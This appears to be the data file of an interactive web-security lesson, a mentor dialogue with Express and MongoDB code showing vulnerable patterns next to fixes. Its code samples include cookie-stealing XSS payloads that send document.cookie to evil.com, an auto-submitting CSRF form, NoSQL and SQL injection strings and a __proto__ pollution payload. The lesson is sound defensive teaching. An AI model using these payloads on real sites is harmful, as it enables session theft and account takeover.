// ─────────────────────────────────────────────────────────────────
//  LESSON: Security
//  Category: Security & Production Operations
// ─────────────────────────────────────────────────────────────────

const LESSON_SECURITY = {
  category: "Security & Production Operations",
  tag: "Application Security",
  title: "How Attackers Think, and How You Stop Them",
  intro: "Security audit results land in your inbox. Three critical findings. Raj pulls up a chair and says the same thing he always says before these conversations.",
  scenes: [

    // ── Security mindset ──
    {
      speaker: "raj",
      text: `"Before we go through the findings — what's your mental model for security? How do you think about it?"`
    },
    {
      speaker: "you",
      text: `"Don't trust user input? Use HTTPS?"`
    },
    {
      speaker: "raj",
      text: `"Good start. The deeper model is: <em>every piece of data has an origin and a destination</em>. When data crosses a trust boundary — from user to server, from server to database, from server to browser — something bad can happen if you don't sanitise or encode it correctly. XSS happens when user data crosses into HTML without encoding. SQL injection happens when user data crosses into a query without parameterisation. CSRF happens when a browser crosses origin boundaries without the server verifying intent. Once you see security in terms of trust boundaries and data flow, you stop memorising attack names and start spotting the pattern yourself."`
    },

    // ── XSS ──
    {
      speaker: "you",
      text: `"First finding is XSS. I know it's Cross-Site Scripting but I've never had it explained properly — how does the attack actually work?"`
    },
    {
      speaker: "raj",
      text: `"XSS happens when an attacker gets their JavaScript into a page and the browser executes it in the context of your domain. Once their script runs on your domain it has full access to everything on that page — cookies, localStorage, the DOM, the ability to make API calls on the user's behalf, even keyloggers. Three types. <em>Stored XSS</em> — attacker posts a comment with a script tag. The script is saved in your database. Every user who views that comment runs the attacker's code. <em>Reflected XSS</em> — the malicious script is in a URL parameter. The server reflects it back in the HTML response. Trick a user into clicking that URL, their browser runs the script. <em>DOM XSS</em> — the vulnerability is entirely in the frontend — JavaScript reads from a URL or form and writes it to the DOM without sanitising."`
    },
    {
      speaker: "you",
      text: `"What does the attacker actually do once their script is running?"`
    },
    {
      speaker: "raj",
      text: `"Most commonly — steal the session cookie or access token and send it to their server. Now they have your session. They can log in as you. Or inject a fake login form over the real page to capture credentials. Or silently make API calls — transfer money, change email address, delete account — all while you think you're reading a news article. The damage depends on what your domain is trusted to do."`
    },
    {
      type: "analogy",
      text: "XSS = someone sneaks a forged note into a staff memo at a bank. Every employee who reads the memo follows the forged instructions because it arrived through a trusted internal channel. The browser treats all scripts on your domain as equally trusted — it can't distinguish yours from the attacker's."
    },
    {
      type: "code",
      text: `// ❌ Stored XSS — attacker posts this as a comment
"Great post! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>"

// Server saves it. Every visitor's browser executes it.
// Attacker receives every visitor's session cookie → full account takeover.

// ❌ DOM XSS — vulnerable frontend code
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello ' + name;
// URL: /welcome?name=&lt;img src=x onerror="fetch('//evil.com?c='+document.cookie)"&gt;
// The onerror handler runs in the user's browser on your domain.

// ✅ Fix 1 — use textContent, not innerHTML (browser won't execute scripts)
document.getElementById('greeting').textContent = 'Hello ' + name;

// ✅ Fix 2 — sanitise on the server before storing (for user-generated HTML)
const createDOMPurify = require('dompurify');
const { JSDOM }       = require('jsdom');
const purify = createDOMPurify(new JSDOM('').window);

const safeHtml = purify.sanitize(userInput, {
  ALLOWED_TAGS:  ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
  ALLOWED_ATTR:  ['href']   // no onclick, no onerror, no javascript: hrefs
});

// ✅ Fix 3 — Content Security Policy header (defence in depth)
// Even if XSS payload gets in, CSP stops scripts loading from attacker's domain
res.setHeader('Content-Security-Policy',
  "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'"
);
// 'self' = only scripts from your own domain are allowed to execute
// object-src 'none' = blocks Flash and plugins
// No 'unsafe-inline' = inline <script> tags are blocked even if injected`
      
    },

    // ── CSRF ──
    {
      speaker: "you",
      text: `"Second finding is CSRF. What's actually happening in a CSRF attack?"`
    },
    {
      speaker: "raj",
      text: `"<em>Cross-Site Request Forgery</em> exploits the fact that browsers automatically attach cookies to every request to a domain — regardless of where the request originated. You're logged into your bank at bank.com. Your session cookie is stored. You visit evil.com. That page contains a hidden form that submits to bank.com/transfer. Your browser loads the page, the form submits automatically, and your browser attaches the bank.com session cookie — because that's what browsers do. The bank sees a valid authenticated request. The transfer goes through. You never clicked anything."`
    },
    {
      speaker: "you",
      text: `"If I'm using JWTs in localStorage instead of cookies, am I safe from CSRF?"`
    },
    {
      speaker: "raj",
      text: `"From CSRF, yes — the attacker's page can't read your localStorage and can't set the Authorization header. But now you're vulnerable to XSS instead, because JavaScript can read localStorage. It's a direct tradeoff. HTTP-only cookies protect from XSS token theft but need CSRF protection. JWTs in memory or localStorage protect from CSRF but need XSS protection. The best modern approach: JWT in HTTP-only cookie with SameSite=Strict. SameSite=Strict tells the browser to never send the cookie on cross-site requests — which eliminates CSRF without a CSRF token."`
    },
    {
      type: "code",
      text: `// CSRF — the attack in plain terms
// Attacker's page (evil.com):
<form action="https://bank.com/transfer" method="POST" id="hack">
  <input name="to"     value="attacker-account">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('hack').submit();</script>
// Victim visits evil.com → form submits → browser sends bank.com session cookie → money gone

// ✅ Defence 1 — SameSite cookie attribute (modern, preferred)
res.cookie('session', token, {
  httpOnly: true,
  secure:   true,
  sameSite: 'Strict'   // browser NEVER sends this cookie on cross-site requests
  // 'Lax' = sent on top-level navigation (clicking links) but not on form submits
  // 'Strict' = never sent cross-site at all — most secure
});

// ✅ Defence 2 — CSRF token (for older browsers or complex flows)
// Server generates a random token and stores it in session
const csrfToken = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = csrfToken;

// Every state-changing form includes the token as a hidden field
// <input type="hidden" name="_csrf" value="<%= csrfToken %>">

// Server verifies on every POST/PUT/DELETE
const verifyCsrf = (req, res, next) => {
  const token = req.body._csrf || req.headers['x-csrf-token'];
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF token invalid' });
  }
  next();
};

// ✅ Defence 3 — check Origin / Referer header
const verifyOrigin = (req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  if (origin && !origin.startsWith('https://myapp.com')) {
    return res.status(403).json({ error: 'Forbidden origin' });
  }
  next();
};`
      
    },

    // ── SQL / NoSQL Injection ──
    {
      speaker: "you",
      text: `"Third finding is injection vulnerabilities. I use MongoDB so I thought I was safe from SQL injection."`
    },
    {
      speaker: "raj",
      text: `"Partly. SQL injection doesn't apply, but <em>NoSQL injection</em> does. In MongoDB, if you pass user input directly as a query object, an attacker can send a JSON object instead of a string and change the semantics of your query entirely. Classic example: login endpoint that takes username and password. Attacker sends the password field as an object <em>{ $ne: null }</em> — that's a MongoDB operator meaning 'not equal to null'. Your query becomes 'find user where username is X and password is not null' — which matches any user with that username regardless of their actual password. Authentication bypassed."`
    },
    {
      speaker: "you",
      text: `"How do I prevent it?"`
    },
    {
      speaker: "raj",
      text: `"Validate and sanitise inputs before they reach your query. Never pass raw req.body fields directly to a MongoDB query. Use <em>express-validator</em> to enforce types — if a field should be a string, reject anything that isn't a string. For an extra layer, the <em>mongo-sanitize</em> package strips any keys that start with $ from an object, which removes MongoDB operator injection. For SQL databases, the equivalent is always using parameterised queries — never string-concatenate user input into SQL."`
    },
    {
      type: "code",
      text: `// ❌ NoSQL injection — passing req.body directly to query
app.post('/login', async (req, res) => {
  const user = await User.findOne({
    email:    req.body.email,    // attacker sends: { $gt: '' }
    password: req.body.password  // attacker sends: { $ne: null }
    // Query becomes: find where email > '' AND password != null → returns first user
    // Authentication completely bypassed
  });
});

// ✅ Fix — validate types, sanitise operators
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // strips $ keys from req.body, req.query, req.params globally

// Or validate explicitly with express-validator
app.post('/login', [
  body('email').isEmail().normalizeEmail(),
  body('password').isString().isLength({ min: 8, max: 128 }),
  validate
], asyncHandler(async (req, res) => {
  // email and password are guaranteed to be strings now
  const { email, password } = req.body;
  const user = await User.findOne({ email }).select('+password');
  if (!user || !await bcrypt.compare(password, user.password))
    return res.status(401).json({ error: 'Invalid credentials' });
  issueTokens(user, res);
}));

// ❌ SQL injection — string concatenation
const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";
// Attacker sends: ' OR '1'='1 → returns all users

// ✅ Parameterised query — driver handles escaping
const result = await pool.query(
  'SELECT * FROM users WHERE email = $1', [req.body.email]
  // $1 is a placeholder — the driver sends email as data, not code
);`
      
    },

    // ── Security headers beyond helmet ──
    {
      speaker: "you",
      text: `"We already have helmet set up. Is there anything it doesn't cover that we should add?"`
    },
    {
      speaker: "raj",
      text: `"A few things. <em>Permissions-Policy</em> — formerly Feature-Policy — controls which browser APIs your page can use. You can explicitly deny access to the camera, microphone, geolocation, and payment APIs so that even if an attacker injects a script, it can't silently activate the user's camera. <em>Cross-Origin-Opener-Policy</em> and <em>Cross-Origin-Embedder-Policy</em> — these enable cross-origin isolation which is required to use certain powerful browser APIs and also prevents Spectre-class attacks where a malicious page reads memory from your page. And make sure your <em>Referrer-Policy</em> is set — controls how much of your URL is sent as the Referer header to third parties, which can leak sensitive URL parameters like password reset tokens."`
    },
    {
      type: "code",
      text: `// Security headers beyond helmet defaults

// Permissions-Policy — restrict browser APIs
res.setHeader('Permissions-Policy',
  'camera=(), microphone=(), geolocation=(), payment=()'
  // Empty () = no origin allowed to use this API
  // Even injected scripts can't activate camera or microphone
);

// Referrer-Policy — don't leak URL in Referer header
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
// Same origin: full URL sent. Cross-origin: only scheme+host, no path.
// Prevents: /reset-password?token=abc leaking to third-party CDN scripts

// Cross-origin isolation — prevents Spectre attacks
res.setHeader('Cross-Origin-Opener-Policy',   'same-origin');
res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
// Required to use SharedArrayBuffer and high-resolution timers

// Expect-CT — deprecated but still seen in interviews
// Replaced by automatic Certificate Transparency enforcement in browsers

// Check your headers at securityheaders.com — gives you a grade
// A+ grade headers setup with helmet
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc:       ["'self'"],
      scriptSrc:        ["'self'"],
      styleSrc:         ["'self'", "'unsafe-inline'"],
      imgSrc:           ["'self'", "data:", "https:"],
      connectSrc:       ["'self'"],
      fontSrc:          ["'self'"],
      objectSrc:        ["'none'"],
      mediaSrc:         ["'none'"],
      frameSrc:         ["'none'"],
      baseUri:          ["'self'"],
      formAction:       ["'self'"],
      upgradeInsecureRequests: []  // redirect HTTP to HTTPS automatically
    }
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true }
}));`
      
    },

    // ── Mass assignment ──
    {
      speaker: "you",
      text: `"What's a mass assignment vulnerability? I haven't heard that term before."`
    },
    {
      speaker: "raj",
      text: `"It happens when you pass req.body directly to a database create or update call without filtering which fields are allowed. Imagine a user update endpoint. You intend to let users update their name and email. But if you pass the whole body to User.findByIdAndUpdate, the user can also send a role field set to 'admin' and you've just given them admin access. Or an isVerified field set to true and they've bypassed email verification. The fix: explicitly whitelist which fields from the request body are allowed to reach the database."`
    },
    {
      type: "code",
      text: `// ❌ Mass assignment — attacker sends { role: 'admin', isVerified: true }
app.put('/users/me', asyncHandler(async (req, res) => {
  const user = await User.findByIdAndUpdate(req.user.userId, req.body, { new: true });
  // req.body = { name: 'Alice', email: 'alice@x.com', role: 'admin' }
  // User is now admin. They just escalated their own privileges.
  res.json(user);
}));

// ✅ Fix 1 — explicitly pick allowed fields
app.put('/users/me', asyncHandler(async (req, res) => {
  const allowed = ['name', 'email', 'bio', 'avatar']; // whitelist
  const updates = {};
  allowed.forEach(field => {
    if (req.body[field] !== undefined) updates[field] = req.body[field];
  });
  const user = await User.findByIdAndUpdate(req.user.userId, updates, { new: true });
  res.json(user);
}));

// ✅ Fix 2 — use express-validator to define exactly what's accepted
app.put('/users/me', [
  body('name').optional().trim().isLength({ max: 100 }),
  body('email').optional().isEmail().normalizeEmail(),
  body('bio').optional().trim().isLength({ max: 500 }),
  // role, isVerified, isAdmin — not listed here → stripped by validator
  validate
], asyncHandler(async (req, res) => {
  const { name, email, bio } = req.body; // only validated fields
  const user = await User.findByIdAndUpdate(
    req.user.userId,
    { name, email, bio },
    { new: true, runValidators: true }
  );
  res.json(user);
}));

// ✅ Fix 3 — Mongoose schema level: mark sensitive fields as non-settable
const userSchema = new Schema({
  role:       { type: String, enum: ['user', 'admin'], default: 'user' },
  isVerified: { type: Boolean, default: false }
});
// But don't rely on this alone — filter at the route level too`
      
    },

    // ── Sensitive data exposure ──
    {
      speaker: "you",
      text: `"What counts as sensitive data exposure? I feel like we might be leaking things without realising."`
    },
    {
      speaker: "raj",
      text: `"The most common ones I see: <em>returning the full user object from the DB</em> — including password hash, internal flags, tokens. Never return what you don't need to. <em>Verbose error messages in production</em> — stack traces reveal your file paths, library versions, database schema. A stack trace is a roadmap for an attacker. <em>Secrets in logs</em> — logging the full request body which contains passwords. <em>Sensitive data in URLs</em> — password reset tokens in query strings get stored in browser history, server logs, Referer headers. Always put tokens in the request body, never the URL."`
    },
    {
      type: "code",
      text: `// ❌ Returning the full DB document
app.get('/users/me', asyncHandler(async (req, res) => {
  const user = await User.findById(req.user.userId);
  res.json(user); // sends: password hash, resetToken, internalFlags, __v
}));

// ✅ Project only safe fields explicitly
app.get('/users/me', asyncHandler(async (req, res) => {
  const user = await User.findById(req.user.userId)
    .select('name email avatar role createdAt -_id'); // explicitly whitelist
  res.json(user);
}));

// ✅ Mongoose — mark sensitive fields as non-selected by default
const userSchema = new Schema({
  password:   { type: String, select: false }, // never returned unless .select('+password')
  resetToken: { type: String, select: false },
});
// User.findById(id) → no password. User.findById(id).select('+password') → with password

// ❌ Verbose errors in production — leaks internals
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.stack }); // reveals file paths, library versions
});

// ✅ Generic message in production, detail in logs only
app.use((err, req, res, next) => {
  logger.error({ err, url: req.url, method: req.method }); // full detail in logs
  res.status(err.status || 500).json({
    error: process.env.NODE_ENV === 'production'
      ? 'Something went wrong'   // generic to user
      : err.message              // detail in development
  });
});

// ❌ Password reset token in URL — stored in browser history and server logs
GET /reset-password?token=abc123verysecret

// ✅ Token in request body — never appears in logs
POST /reset-password
{ "token": "abc123verysecret", "newPassword": "..." }

// ❌ Logging request body — logs contain raw passwords
logger.info('Incoming request', { body: req.body });

// ✅ Scrub sensitive fields before logging
const { password, token, ...safeBody } = req.body;
logger.info('Incoming request', { body: safeBody });`
      
    },

    // ── Dependency vulnerabilities ──
    {
      speaker: "you",
      text: `"How much should I worry about vulnerabilities in third-party packages? We have hundreds of dependencies."`
    },
    {
      speaker: "raj",
      text: `"Enough to automate it. Manually auditing 800 packages is impossible. The strategy: run <em>npm audit</em> in your CI pipeline and fail builds on high or critical severity findings. Use <em>Dependabot</em> or <em>Renovate</em> — GitHub bots that automatically open PRs to update vulnerable packages. The important nuance: npm audit flags vulnerabilities, but not all of them are actually exploitable in your context. A critical vulnerability in a package used only in a test helper that never runs in production is lower priority than a moderate one in your auth middleware. Learn to read CVE descriptions — check if the vulnerable code path is reachable in your app."`
    },
    {
      type: "code",
      text: `// Automate security scanning in CI — .github/workflows/security.yml
name: Security Audit
on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20' }
      - run: npm ci

      # Fail build on high/critical vulnerabilities
      - run: npm audit --audit-level=high

      # More comprehensive — Snyk has a larger vuln database
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

// Dependabot — auto-PRs for vulnerable packages
// .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 10

// Renovate — more configurable alternative to Dependabot
// renovate.json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:base"],
  "vulnerabilityAlerts": { "enabled": true },
  "automerge": true,           // auto-merge patch updates
  "major": { "automerge": false } // require review for major bumps
}`
      
    },

    // ── HTTPS and TLS ──
    {
      speaker: "you",
      text: `"We use HTTPS obviously — but what actually makes HTTPS secure? What does TLS do?"`
    },
    {
      speaker: "raj",
      text: `"TLS does three things. <em>Encryption</em> — data in transit is encrypted so a network observer can't read it. <em>Authentication</em> — your certificate proves the server is who it claims to be. Without this, an attacker on the network could intercept traffic and present their own server — a man-in-the-middle attack. <em>Integrity</em> — a MAC on each message means data can't be tampered with in transit without detection. The certificate is the critical piece — it's issued by a trusted Certificate Authority who verified you control the domain. The browser trusts the CA's list, so it trusts your certificate. Use <em>Let's Encrypt</em> for free, auto-renewing certificates. TLS 1.3 only — disable TLS 1.0 and 1.1 in your Nginx config, they have known vulnerabilities."`
    },
    {
      type: "code",
      text: `# Nginx — TLS hardening
server {
  listen 443 ssl http2;

  # Only TLS 1.2 and 1.3 — disable older vulnerable versions
  ssl_protocols TLSv1.2 TLSv1.3;

  # Strong cipher suites only (TLS 1.3 handles its own ciphers)
  ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384;
  ssl_prefer_server_ciphers off; # TLS 1.3 should choose, not the server

  # HSTS — tell browsers to always use HTTPS for this domain
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
  # preload = submit to Chrome/Firefox HSTS preload list — even first visit is HTTPS

  # OCSP stapling — server pre-fetches cert revocation status, faster for clients
  ssl_stapling on;
  ssl_stapling_verify on;

  # Let's Encrypt certificate (auto-renewed by certbot)
  ssl_certificate     /etc/letsencrypt/live/myapp.com/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/api.myapp.com/privkey.pem;
}

# Force HTTPS — redirect all HTTP traffic
server {
  listen 80;
  return 301 https://$host$request_uri;
}

# Test your TLS config: ssllabs.com/ssltest — aim for A+ grade`
      
    },

    // ── Secrets management ──
    {
      speaker: "you",
      text: `"Where should secrets actually live in production? We just have a .env file on the server right now."`
    },
    {
      speaker: "raj",
      text: `"A .env file on a server is a risk — it's a plaintext file that anyone with server access can read, it doesn't have access controls, it's not audited, and there's no rotation mechanism. In production, use a <em>secrets manager</em>. AWS Secrets Manager or Parameter Store, HashiCorp Vault, or GCP Secret Manager. Your app fetches secrets at startup over an authenticated API call. The secret manager logs every access, supports versioning and rotation, and you can restrict which services can access which secrets with IAM policies. Secrets never touch the filesystem. The only thing on the server is credentials to authenticate with the secrets manager."`
    },
    {
      type: "code",
      text: `// AWS Secrets Manager — fetch secrets at startup
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');

const secretsClient = new SecretsManagerClient({ region: 'us-east-1' });

const loadSecrets = async () => {
  const response = await secretsClient.send(new GetSecretValueCommand({
    SecretId: 'myapp/production/secrets'
  }));
  const secrets = JSON.parse(response.SecretString);

  // Inject into process.env at startup — rest of app uses process.env as normal
  process.env.JWT_SECRET       = secrets.jwtSecret;
  process.env.DATABASE_URL     = secrets.databaseUrl;
  process.env.STRIPE_SECRET    = secrets.stripeSecret;
};

// index.js — load secrets before starting app
await loadSecrets();
const app = require('./app');
app.listen(3000);

// Secret rotation — automated with Secrets Manager
// 1. Secrets Manager generates new secret value
// 2. Calls your Lambda rotation function to update the actual service
// 3. Old secret remains valid for a grace period
// 4. After grace period, old secret is deleted

// Environment-based secret access (IAM role on EC2/ECS — no hardcoded AWS keys)
// EC2 instance has IAM role with GetSecretValue permission on myapp/production/*
// No AWS_ACCESS_KEY_ID needed — role credentials auto-injected by AWS metadata service`
      
    },

    // ── Prototype pollution ──
    {
      speaker: "you",
      text: `"What's prototype pollution? I've seen it in npm audit reports but don't really understand it."`
    },
    {
      speaker: "raj",
      text: `"JavaScript prototype pollution is a class of vulnerability specific to JavaScript's prototype chain. Every object in JS inherits from Object.prototype. If an attacker can set a property on Object.prototype — through a vulnerability in how your app merges or copies untrusted objects — that property appears on every object in your entire application. It can override toString, valueOf, or custom properties that your code relies on. Imagine a deep merge function that processes user-provided JSON. The attacker sends <em>{ '__proto__': { 'isAdmin': true } }</em>. If merged naively, now every object in your app has isAdmin: true. An admin check that does <em>if (user.isAdmin)</em> would pass for everyone."`
    },
    {
      type: "code",
      text: `// ❌ Vulnerable deep merge — processes __proto__ as a key
const merge = (target, source) => {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
};

// Attacker sends: { "__proto__": { "isAdmin": true } }
merge({}, JSON.parse(userInput));
// Now: ({}).isAdmin === true — every object in the app is "admin"

// ✅ Fix 1 — use Object.create(null) for accumulator objects (no prototype)
const safeObj = Object.create(null); // has no prototype — __proto__ attack can't work

// ✅ Fix 2 — check for prototype-polluting keys
const safeMerge = (target, source) => {
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    // ... rest of merge
  }
};

// ✅ Fix 3 — use well-maintained libraries (lodash merge is patched for this)
const _ = require('lodash');
_.merge({}, userProvidedObject); // lodash handles __proto__ safely

// ✅ Fix 4 — freeze Object.prototype in your app entrypoint
Object.freeze(Object.prototype);
// Any attempt to set properties on Object.prototype now throws in strict mode

// Check if you're affected: Object.prototype.polluted after your code runs?
// Use: npx is-my-node-vulnerable to check Node version for known issues`
      
    },

    // ── Security checklist ──
    {
      speaker: "raj",
      text: `"Before we wrap — if someone asked you to do a security review of a new Express API, what would you check first?"`
    },
    {
      speaker: "you",
      text: `"Input validation, HTTPS, auth headers..."`
    },
    {
      speaker: "raj",
      text: `"Good foundation. Full checklist: authentication using short-lived JWTs in HTTP-only SameSite=Strict cookies. All inputs validated and typed. No raw req.body to DB queries. Only whitelisted fields updated. No sensitive data in responses — use select() and project. Generic error messages in production with detail only in logs. No tokens or secrets in URLs or logs. helmet with a tight CSP. npm audit in CI. Secrets in a manager not .env files. HTTPS only with HSTS. Rate limiting on auth endpoints. And after all that — write tests that explicitly try to break your own security. If your test doesn't try to log in as an admin by sending role:admin in the request body, you haven't tested for mass assignment."`
    },

    {
      type: "summary",
      points: [
        "Security = trust boundaries. Every time data crosses a boundary (user→server, server→DB, server→browser) encode or sanitise it.",
        "XSS = attacker script runs on your domain. Stored (in DB), Reflected (in URL), DOM (in frontend JS). Use textContent not innerHTML.",
        "CSP header = browser enforces which script sources are allowed. Blocks injected scripts even if XSS payload gets in.",
        "CSRF = browser auto-sends cookies cross-origin. Fix: SameSite=Strict cookie. Fallback: CSRF token or Origin header check.",
        "JWTs in HTTP-only cookies = safe from XSS theft but needs CSRF protection. In localStorage = safe from CSRF but vulnerable to XSS.",
        "NoSQL injection = operator keys like $ne in user input. Fix: validate types, use mongo-sanitize, never pass raw req.body to queries.",
        "SQL injection = string-concatenated queries. Fix: always use parameterised queries. No exceptions.",
        "Mass assignment = passing req.body directly to DB update. Fix: whitelist allowed fields explicitly at the route level.",
        "Sensitive data exposure: never return full DB documents, scrub passwords from logs, put reset tokens in body not URL.",
        "Permissions-Policy = restrict camera/mic/geo APIs so injected scripts can't activate them.",
        "Referrer-Policy = prevent URL parameters (including tokens) leaking in Referer header to third parties.",
        "Prototype pollution = attacker sets properties on Object.prototype via unsafe merge. Fix: skip __proto__ key, freeze prototype, use patched lodash.",
        "TLS: encryption + server authentication + integrity. TLS 1.2/1.3 only. HSTS with preload. OCSP stapling.",
        "Secrets manager > .env file. Audited, rotated, IAM-controlled, never on filesystem.",
        "Automate: npm audit in CI at high severity. Dependabot/Renovate for automatic update PRs. Test that your own security controls actually block attacks."
      ]
    }
  ]
};
